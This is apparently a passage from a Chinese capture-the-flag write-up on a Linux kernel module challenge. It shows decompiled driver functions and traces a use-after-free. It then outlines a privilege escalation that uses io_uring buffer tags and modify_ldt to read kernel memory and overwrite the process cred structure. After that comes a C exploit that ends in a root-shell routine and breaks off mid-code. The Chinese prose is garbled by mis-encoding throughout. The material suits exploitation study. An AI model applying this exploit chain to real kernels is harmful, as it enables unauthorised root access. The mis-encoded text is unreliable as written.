&#125;</span><br><span class="line">LABEL_10:</span><br><span class="line">        v9 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v10 = key_list[v9];</span><br><span class="line">          <span class="keyword">if</span> ( !v10 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">          *(_DWORD *)(v1 - <span class="number">0x3C</span>) = v9++;</span><br><span class="line">          v11 = <span class="built_in">strcmp</span>(v10, v5);</span><br><span class="line">          v12 = *(_DWORD *)(v1 - <span class="number">0x3C</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v11 );</span><br><span class="line">        <span class="keyword">if</span> ( v12 == <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          cur[<span class="number">2</span>] += v2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v12 &lt;= <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v12 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( v12 == <span class="number">1</span> )</span><br><span class="line">              cur[<span class="number">1</span>] = <span class="string">&quot;lucky&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            kfree(*cur);</span><br><span class="line">            *cur = v2;</span><br><span class="line">            v2 = <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_18:</span><br><span class="line">        kfree(v2);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  cur = a1-&gt;cur;</span><br><span class="line">  <span class="keyword">if</span> ( !cur )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯<code>change</code>å‡½æ•°ï¼Œè¿™é“é¢˜å”¯ä¸€éš¾é€†å‘çš„åœ°æ–¹å°±åœ¨è¿™é‡Œï¼Œä»”ç»†çœ‹å…¶å®ä¹ŸæŒºç®€å•çš„ï¼Œå°±æ˜¯è¿›è¡Œå­—ç¬¦ä¸²å¯¹æ¯”ç„¶åè¿›å…¥ç›¸åº”çš„åˆ†å€¼ï¼Œå…¶ä¸­<code>kmemdup_nul</code>å‡½æ•°ä¼šåˆ†é…ä¸€ä¸ªå †å—ï¼Œæ‰€ä»¥è¿™é‡Œå°±æ˜¯é¦–å…ˆ<code>kfree</code>æ‰å½“å‰<code>context-&gt;cur[0]</code>ç„¶åå°†æ–°åˆ†é…çš„å †å—æ”¾è¿›å»ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">delMaind_0</span><span class="params">(Maind *context)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *cur; <span class="comment">// r14</span></span><br><span class="line">  _QWORD *prv; <span class="comment">// r13</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  printk(<span class="string">&quot;die\n&quot;</span>);</span><br><span class="line">  cur = context-&gt;cur;</span><br><span class="line">  prv = context-&gt;prv;</span><br><span class="line">  <span class="keyword">if</span> ( cur )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(*cur);</span><br><span class="line">    *cur = <span class="number">0LL</span>;</span><br><span class="line">    kfree(cur);</span><br><span class="line">    context-&gt;cur = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( prv )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(*prv);</span><br><span class="line">    *prv = <span class="number">0LL</span>;</span><br><span class="line">    kfree(prv);</span><br><span class="line">    context-&gt;prv = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  kfree(context);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°å…¶å®ä¹Ÿå°±æ˜¯<code>hhoge_unlocked_ioctl_cold</code>ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œä¼š<code>kfree</code>æ‰çš„ä¸œè¥¿å¾ˆå¤šã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">hhoge_read</span><span class="params">(file *file, <span class="keyword">char</span> *ubuf, <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *ppos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  Maind *private_data; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *v6; <span class="comment">// r14</span></span><br><span class="line">  __int64 v7; <span class="comment">// r12</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  private_data = (Maind *)file-&gt;private_data;</span><br><span class="line">  <span class="keyword">if</span> ( !private_data )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v6 = private_data-&gt;cur;</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = <span class="number">9LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt;= <span class="number">9</span> )</span><br><span class="line">      v7 = v4;</span><br><span class="line">    _check_object_size(private_data-&gt;cur, v7, <span class="number">1LL</span>);</span><br><span class="line">    copy_to_user(ubuf, v6, v7);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åå°±æ˜¯readå‡½æ•°ï¼Œæœ€å¤šåªå…è®¸è¯»å–9ä¸ªå­—èŠ‚çš„å†…å®¹ã€‚å¯ä»¥å¾ˆå®¹æ˜“çš„çœ‹å‡ºæ¥ï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥è¯»å–åˆ°å †åœ°å€ã€‚</p><p>é¢˜ç›®çš„æ¼æ´å¾ˆæ˜æ˜¾ï¼Œå¦‚æœæˆ‘ä»¬ä½¿ç”¨<code>change_cold</code>å‡½æ•°åˆ†é…ä¸€ä¸ªå †å—ï¼Œé‚£ä¹ˆæ­¤æ—¶è¿™ä¸ªå †å—çš„åœ°å€åœ¨<code>context-&gt;cur[0]</code>ä¸­éšåè°ƒç”¨<code>reborn_0</code>å‡½æ•°ï¼Œé‚£ä¹ˆå †å—åœ°å€åœ¨<code>context-&gt;prv[0]</code>ä¸­ä¹Ÿå­˜åœ¨äº†ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬å†æ¬¡è°ƒç”¨<code>change_cold</code>å‡½æ•°çš„è¯ï¼Œå°±ä¼š<code>kfree</code>è°ƒç”¨<code>context-&gt;cur[0]</code>ä¸­çš„å †å—ï¼Œä½†æ˜¯æ­¤æ—¶<code>context-&gt;prv[0]</code>æŒ‡é’ˆä»ç„¶ä¿å­˜ç€ç›®æ ‡å †å—çš„åœ°å€ï¼Œæ­¤æ—¶å°±å½¢æˆäº†UAFã€‚</p><h3 id="åˆ©ç”¨åˆ†æ"><a href="#åˆ©ç”¨åˆ†æ" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h3><p>çŸ¥é“äº†io_uringä»¥åŠä¸Šé¢çš„æ¼æ´çš„è¯åˆ©ç”¨æ–¹å¼å°±å¾ˆæ˜æ˜¾äº†ï¼Œè¿™é‡Œå¯ä»¥é¦–å…ˆåˆ©ç”¨io_uringå¯ä»¥éšæ„æ›´æ–°å†…å®¹çš„æœºåˆ¶ä»¥åŠreadå¯ä»¥æ³„æ¼å‡ºå †åœ°å€é…åˆ<code>modify_ldt</code>å®ç°ä»»æ„åœ°å€è¯»ï¼Œåœ¨å †åŒºä¸­å¯»åœ¨<code>task_struct</code>ç»“æ„ä½“ï¼Œè¿›è€Œè·å¾—<code>cred</code>åœ°å€ã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯åœ¨æ–°ç‰ˆæœ¬<code>task_struct</code>åœ¨è¿™ä¸€ç‰‡åŒºåŸŸæœ‰ä¸€ç‚¹å°å˜åŒ–ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="comment">/* Cached requested key. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * executable name, excluding path.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment"> * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment"> * - lock it with task_lock()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">char</span>comm[TASK_COMM_LEN];</span><br></pre></td></tr></table></figure><p>commå’Œcredä¸­é—´æ–°å¢äº†ä¸€ä¸ªæŒ‡é’ˆã€‚</p><p>éšåé‡Šæ”¾æ‰ldtç»“æ„ä½“ï¼Œè®©<code>ctx-&gt;buf_data-&gt;tag</code>ä¹Ÿå°±æ˜¯ä¸Šé¢çš„<code>table</code>åˆ†é…çš„å¤§å°ä¸º0x10ï¼Œä½¿<code>table</code>å æ®è¿™ä¸ªUAFçš„å †å—ã€‚é‚£æˆ‘ä»¬å¯ä»¥é€šè¿‡ring0çš„<code>ctx-&gt;buf_data-&gt;tag[0]</code>ä¹Ÿå°±æ˜¯<code>table[0]</code>å»ä¿®æ”¹ring1çš„<code>ctx-&gt;buf_data-&gt;tags</code>ä¸º<code>cred</code>åœ°å€ï¼Œå¦‚æœæˆ‘ä»¬æ­¤æ—¶ä¿®æ”¹ring1çš„<code>ctx-&gt;buf_data-&gt;tag[0]</code>å°±å¯ä»¥ä¿®æ”¹åˆ°<code>cred</code>ç»“æ„ä½“äº†ï¼Œå®Œæˆäº†ææƒã€‚</p><p>ä¸ç†Ÿæ‚‰ä¸Šè¿°æåˆ°çš„ææƒæ–¹å¼å¯ä»¥çœ‹ä¸€ä¸‹è¿™ç¯‡æ–‡ç«  <a class="link"   href="https://cv196082.gitee.io/2022/08/03/kernel-pwn%E5%86%85%E5%AD%98%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90/" >kernel pwnå†…å­˜ä»»æ„è¯»å†™æå‡æƒé™[1]<i class="fas fa-external-link-alt"></i></a></p><p>ä¸ç†Ÿæ‚‰<code>modify_ldt</code>çš„å¯ä»¥çœ‹ä¸€ä¸‹è¿™ç¯‡æ–‡ç«  <a class="link"   href="https://cv196082.gitee.io/2022/08/14/modify-ldt%E5%88%A9%E7%94%A8/" >modify_ldtåˆ©ç”¨<i class="fas fa-external-link-alt"></i></a></p><h3 id="ç»¼ä¸Šå¯å¾—exp"><a href="#ç»¼ä¸Šå¯å¾—exp" class="headerlink" title="ç»¼ä¸Šå¯å¾—exp"></a>ç»¼ä¸Šå¯å¾—exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;liburing.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring</span> <span class="title">ring</span>, <span class="title">ring1</span>, <span class="title">ring2</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> entries;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> nr_entries;</span><br><span class="line">    <span class="keyword">int</span> slot;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_uring</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    io_uring_queue_init(<span class="number">2</span>, &amp;ring, <span class="number">0</span>);</span><br><span class="line">    io_uring_queue_init(<span class="number">2</span>, &amp;ring1, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_tag</span><span class="params">(struct io_uring *ring, <span class="keyword">size_t</span> *data, <span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> tmp_buf[<span class="number">0x2000</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">vecs</span>[<span class="title">num</span>];</span></span><br><span class="line">    <span class="keyword">size_t</span> tags[num];</span><br><span class="line">    <span class="built_in">memcpy</span>(tags, data, num * <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        vecs[i].iov_base = tmp_buf;</span><br><span class="line">        vecs[i].iov_len = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> res = io_uring_register_buffers_tags(ring, vecs, tags, num);</span><br><span class="line">    <span class="keyword">if</span> (res &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="built_in">sprintf</span>(<span class="string">&quot;io_uring_register_buffers_tags %d\n&quot;</span>, res));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update_tag</span><span class="params">(struct io_uring *ring, <span class="keyword">size_t</span> Data, <span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> tmp_buf[<span class="number">1024</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">vecs</span>[2];</span></span><br><span class="line">    vecs[<span class="number">0</span>].iov_base = tmp_buf;</span><br><span class="line">    vecs[<span class="number">0</span>].iov_len = <span class="number">1</span>;</span><br><span class="line">    vecs[<span class="number">1</span>].iov_base = tmp_buf;</span><br><span class="line">    vecs[<span class="number">1</span>].iov_len = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> ret = io_uring_register_buffers_update_tag(ring, <span class="number">0</span>, vecs, Data, num);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="built_in">sprintf</span>(<span class="string">&quot;io_uring_register_buffers_update_tag %d\n&quot;</span>, ret));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">10</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span 